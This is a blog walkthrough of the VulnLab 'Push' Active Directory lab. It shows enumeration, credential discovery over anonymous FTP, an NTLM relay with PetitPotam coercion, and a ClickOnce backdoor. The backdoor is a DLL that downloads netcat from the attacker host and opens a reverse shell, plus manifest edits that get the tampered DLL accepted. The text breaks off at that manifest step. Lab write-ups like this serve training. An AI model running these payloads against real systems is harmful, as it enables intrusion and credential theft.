<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration TestingThis comprehensive walkthrough covers the Push machine from VulnLab &#x2F; Hack The Box, a challenging">
<meta property="og:type" content="article">
<meta property="og:title" content="VL-Push">
<meta property="og:url" content="https://panosoikogr.github.io/2025/11/23/VL-Push/index.html">
<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
<meta property="og:description" content="Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration TestingThis comprehensive walkthrough covers the Push machine from VulnLab &#x2F; Hack The Box, a challenging">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/Valid-creds.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/admin-ms01-hash.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/share-access-ms01.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/self-service.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/manifest-change.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/getting-shell.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/rbcd-path.png">
<meta property="og:image" content="https://panosoikogr.github.io/images/Push/Secrets-dump.png">
<meta property="article:published_time" content="2025-11-23T19:58:30.000Z">
<meta property="article:modified_time" content="2025-11-23T20:03:10.155Z">
<meta property="article:author" content="Panosoiko">
<meta property="article:tag" content="Chain">
<meta property="article:tag" content="Hack The Box">
<meta property="article:tag" content="ProLab">
<meta property="article:tag" content="VulnLab">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://panosoikogr.github.io/images/Push/Valid-creds.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>VL-Push</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-73BMC8ZHB7');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 8.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writeups</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/22/VL-Kaiju/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/23/VL-Push/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&text=VL-Push"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&is_video=false&description=VL-Push"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=VL-Push&body=Check out this article: https://panosoikogr.github.io/2025/11/23/VL-Push/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&title=VL-Push"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/23/VL-Push/&name=VL-Push&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/23/VL-Push/&t=VL-Push"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Push-VulnLab-Walkthrough-Writeup-Active-Directory-Chain-ProLab-Penetration-Testing"><span class="toc-number">1.</span> <span class="toc-text">Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration Testing</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Information"><span class="toc-number">1.1.</span> <span class="toc-text">Network Information</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC01-push-vl"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan - DC01.push.vl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-MS01-push-vl"><span class="toc-number">1.2.2.</span> <span class="toc-text">Nmap Scan - MS01.push.vl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-FTP"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unintended-Path-NTLM-Relay-Attack"><span class="toc-number">1.4.</span> <span class="toc-text">Unintended Path - NTLM Relay Attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intended-Path-ClickOnce-Application-Exploitation"><span class="toc-number">1.5.</span> <span class="toc-text">Intended Path - ClickOnce Application Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerating-Share-Access"><span class="toc-number">1.5.1.</span> <span class="toc-text">Enumerating Share Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Malicious-DLL"><span class="toc-number">1.5.2.</span> <span class="toc-text">Creating the Malicious DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modifying-the-Manifest-Files"><span class="toc-number">1.5.3.</span> <span class="toc-text">Modifying the Manifest Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Discovering-Additional-Credentials"><span class="toc-number">1.5.4.</span> <span class="toc-text">Discovering Additional Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Path"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation Path</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Resource-Based-Constrained-Delegation-RBCD"><span class="toc-number">1.6.1.</span> <span class="toc-text">Resource-Based Constrained Delegation (RBCD)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Obtaining-sccadmin-Credentials"><span class="toc-number">1.7.</span> <span class="toc-text">Obtaining sccadmin Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Golden-Certificate-Attack"><span class="toc-number">1.8.</span> <span class="toc-text">Golden Certificate Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backing-Up-CA-Keys"><span class="toc-number">1.8.1.</span> <span class="toc-text">Backing Up CA Keys</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forging-the-Certificate"><span class="toc-number">1.8.2.</span> <span class="toc-text">Forging the Certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Certificate-Technique"><span class="toc-number">1.8.3.</span> <span class="toc-text">Pass The Certificate Technique</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Complete-Attack-Chain"><span class="toc-number">1.8.4.</span> <span class="toc-text">Complete Attack Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Domain-Compromise"><span class="toc-number">1.8.5.</span> <span class="toc-text">Domain Compromise</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-Coercing-SCCM-Authentication"><span class="toc-number">1.9.</span> <span class="toc-text">Alternative Path - Coercing SCCM Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        VL-Push
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Panosoiko</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-23T19:58:30.000Z" class="dt-published" itemprop="datePublished">2025-11-23</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Push-VulnLab-Walkthrough-Writeup-Active-Directory-Chain-ProLab-Penetration-Testing"><a href="#Push-VulnLab-Walkthrough-Writeup-Active-Directory-Chain-ProLab-Penetration-Testing" class="headerlink" title="Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration Testing"></a>Push VulnLab Walkthrough &amp; Writeup - Active Directory Chain &#x2F; ProLab Penetration Testing</h1><p>This comprehensive walkthrough covers the <strong>Push machine from VulnLab &#x2F; Hack The Box</strong>, a challenging Active Directory chain that simulates real-world enterprise environments. This writeup demonstrates advanced penetration testing techniques including NTLM relay attacks, ClickOnce exploitation, RBCD (Resource-Based Constrained Delegation), and certificate forgery attacks against Active Directory Certificate Services (AD CS).</p>
<p>Whether you’re preparing for OSCP, practicing for Hack The Box ProLabs, or looking to enhance your Active Directory penetration testing skills, this VulnLab Push writeup provides detailed exploitation steps and multiple attack paths to achieve domain compromise.</p>
<h2 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.225.5 DC01.push.vl</span><br><span class="line">10.10.225.6 MS01.push.vl</span><br></pre></td></tr></table></figure>

<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Nmap-Scan-DC01-push-vl"><a href="#Nmap-Scan-DC01-push-vl" class="headerlink" title="Nmap Scan - DC01.push.vl"></a>Nmap Scan - DC01.push.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: push.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.push.vl</span><br><span class="line">| Subject Alternative Name: DNS:DC01.push.vl</span><br><span class="line">443/tcp   open  ssl/https     syn-ack</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">49538/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49664/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49874/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">51875/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">51876/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">51903/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h3 id="Nmap-Scan-MS01-push-vl"><a href="#Nmap-Scan-MS01-push-vl" class="headerlink" title="Nmap Scan - MS01.push.vl"></a>Nmap Scan - MS01.push.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON  VERSION</span><br><span class="line">21/tcp    open  ftp           syn-ack Microsoft ftpd</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| 08-03-23  08:49PM       &lt;DIR&gt;          .config</span><br><span class="line">| 08-03-23  08:49PM       &lt;DIR&gt;          .git</span><br><span class="line">|_08-03-23  08:49PM       &lt;DIR&gt;          dev</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: SelfService</span><br><span class="line">135/tcp   open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-11-22T22:31:58+00:00; -1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=MS01.push.vl</span><br><span class="line">| Issuer: commonName=MS01.push.vl</span><br><span class="line">5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class="line">62839/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h2 id="Initial-Access-via-FTP"><a href="#Initial-Access-via-FTP" class="headerlink" title="Initial Access via FTP"></a>Initial Access via FTP</h2><p>From the nmap scan, we discovered that anonymous FTP login is enabled on MS01. After connecting, we found that the directories were empty, but there was a hidden <code>.git-credentials</code> file containing domain credentials.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.225.6</span><br></pre></td></tr></table></figure>

<p>Listing hidden files revealed the credential file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; dir -a</span><br><span class="line">229 Entering Extended Passive Mode (|||59972|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">08-03-23  08:49PM       &lt;DIR&gt;          .config</span><br><span class="line">08-03-23  08:49PM       &lt;DIR&gt;          .git</span><br><span class="line">08-03-23  08:49PM                   44 .git-credentials</span><br><span class="line">08-03-23  08:49PM       &lt;DIR&gt;          dev</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>The credentials found were:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://olivia.wood:&lt;PASS&gt;@github.com</span><br></pre></td></tr></table></figure>

<p>These credentials are valid for the domain:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.225.5 -u olivia.wood -p &lt;PASS&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Push/Valid-creds.png" alt="Valid domain credentials"></p>
<h2 id="Unintended-Path-NTLM-Relay-Attack"><a href="#Unintended-Path-NTLM-Relay-Attack" class="headerlink" title="Unintended Path - NTLM Relay Attack"></a>Unintended Path - NTLM Relay Attack</h2><p>We noticed that SMB signing is not enabled on MS01, which allows us to perform an NTLM relay attack to obtain the local administrator’s SAM hash.</p>
<p>First, we add a DNS record pointing to our attacking machine:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u &#x27;push.vl&#x27;\\&#x27;olivia.wood&#x27; -p &#x27;&lt;PASS&gt;&#x27; --action add --record localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA --data &lt;YOUR IP&gt; &lt;DC-IP&gt;</span><br></pre></td></tr></table></figure>

<p>Start the NTLM relay server:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ntlmrelayx.py -t smb://10.10.225.6 -smb2support --no-http-server</span><br></pre></td></tr></table></figure>

<p>Coerce authentication using NetExec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.225.6 -u olivia.wood -p &lt;PASS&gt; -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</span><br></pre></td></tr></table></figure>

<p>This method successfully captures the local administrator’s hash.</p>
<p><img src="/images/Push/admin-ms01-hash.png" alt="Administrator hash captured"></p>
<p>For more information on how this attack works, refer to this blog post:<br><a href="https://panosoikogr.github.io/2025/11/21/CVE-2025-33073/">https://panosoikogr.github.io/2025/11/21/CVE-2025-33073/</a></p>
<p>Using the captured hash, we can dump LSA secrets and discover credentials for another domain user:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.225.6 -u administrator -H &lt;HASH&gt; --local-auth --lsa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH\kelly.hill:&lt;PASS&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Intended-Path-ClickOnce-Application-Exploitation"><a href="#Intended-Path-ClickOnce-Application-Exploitation" class="headerlink" title="Intended Path - ClickOnce Application Exploitation"></a>Intended Path - ClickOnce Application Exploitation</h2><h3 id="Enumerating-Share-Access"><a href="#Enumerating-Share-Access" class="headerlink" title="Enumerating Share Access"></a>Enumerating Share Access</h3><p>We enumerate share access on MS01 and discover that we have write permissions on the ClickOnce application share (wwwroot):</p>
<p><img src="/images/Push/share-access-ms01.png" alt="Share access on MS01"></p>
<p><img src="/images/Push/self-service.png" alt="SelfService application"></p>
<p>We find a <code>last_run.txt</code> file that gets updated periodically with new timestamps:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Last Execution: 17:18&quot;</span><br></pre></td></tr></table></figure>

<p>This indicates the application is being actively executed. We’ll exploit this ClickOnce application to gain a shell.</p>
<p>For detailed information on how ClickOnce exploitation works, refer to this excellent article:<br><a target="_blank" rel="noopener" href="https://infosecwriteups.com/backdooring-clickonce-net-for-initial-access-a-practical-example-1eb6863c0579">https://infosecwriteups.com/backdooring-clickonce-net-for-initial-access-a-practical-example-1eb6863c0579</a></p>
<h3 id="Creating-the-Malicious-DLL"><a href="#Creating-the-Malicious-DLL" class="headerlink" title="Creating the Malicious DLL"></a>Creating the Malicious DLL</h3><p>Create a malicious DLL that will download and execute netcat:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)&#123;</span><br><span class="line">    switch(dwReason)&#123;</span><br><span class="line">        case DLL_PROCESS_ATTACH:</span><br><span class="line"> </span><br><span class="line">            system(&quot;curl 10.8.5.195/nc64.exe -o C:\\Windows\\Temp\\nc64.exe&quot;);</span><br><span class="line">            system(&quot;C:\\Windows\\Temp\\nc64.exe 10.8.5.195 4444 -e cmd.exe&quot;);</span><br><span class="line"> </span><br><span class="line">            break;</span><br><span class="line">        case DLL_PROCESS_DETACH:</span><br><span class="line">            break;</span><br><span class="line">        case DLL_THREAD_ATTACH:</span><br><span class="line">            break;</span><br><span class="line">        case DLL_THREAD_DETACH:</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Modifying-the-Manifest-Files"><a href="#Modifying-the-Manifest-Files" class="headerlink" title="Modifying the Manifest Files"></a>Modifying the Manifest Files</h3><p>Generate the SHA256 hash of the malicious DLL:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl dgst -binary -sha256 ./SelfService.dll.deploy | openssl enc -base64</span><br></pre></td></tr></table></figure>

<p>Download the manifest file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get SelfService.dll.manifest</span><br></pre></td></tr></table></figure>

<p>Update the hash and size in the manifest file:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;/file&gt;</span><br><span class="line">&lt;file name=&quot;SelfService.dll&quot; size=&quot;85492&quot;&gt;</span><br><span class="line">  &lt;hash&gt;</span><br><span class="line">    &lt;dsig:Transforms&gt;</span><br><span class="line">      &lt;dsig:Transform Algorithm=&quot;urn:schemas-microsoft-com:HashTransforms.Identity&quot; /&gt;</span><br><span class="line">    &lt;/dsig:Transforms&gt;</span><br><span class="line">    &lt;dsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha256&quot; /&gt;</span><br><span class="line">    &lt;dsig:DigestValue&gt;100MlrAqSf530I0UXjdFdEJHDCa20Ouo0iteE6NEzpw=&lt;/dsig:DigestValue&gt;</span><br><span class="line">  &lt;/hash&gt;</span><br><span class="line">&lt;/file&gt;</span><br></pre></td></tr></table></figure>

<p>To find the exact size: <code>stat -c %s SelfService.dll.deploy</code></p>
<p>Also, change the <code>publicKeyToken</code> in <code>asmv1:assemblyIdentity</code> to <code>0000000000000000</code></p>
<p>We also need to update the <code>DigestValue</code> and size of <code>SelfService.dll.manifest</code> in the <code>SelfService.Application</code> file and zero out the <code>publicKeyToken</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl dgst -binary -sha256 SelfService.dll.manifest | openssl enc -base64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get SelfService.application</span><br></pre></td></tr></table></figure>

<p><img src="/images/Push/manifest-change.png" alt="Manifest changes"></p>
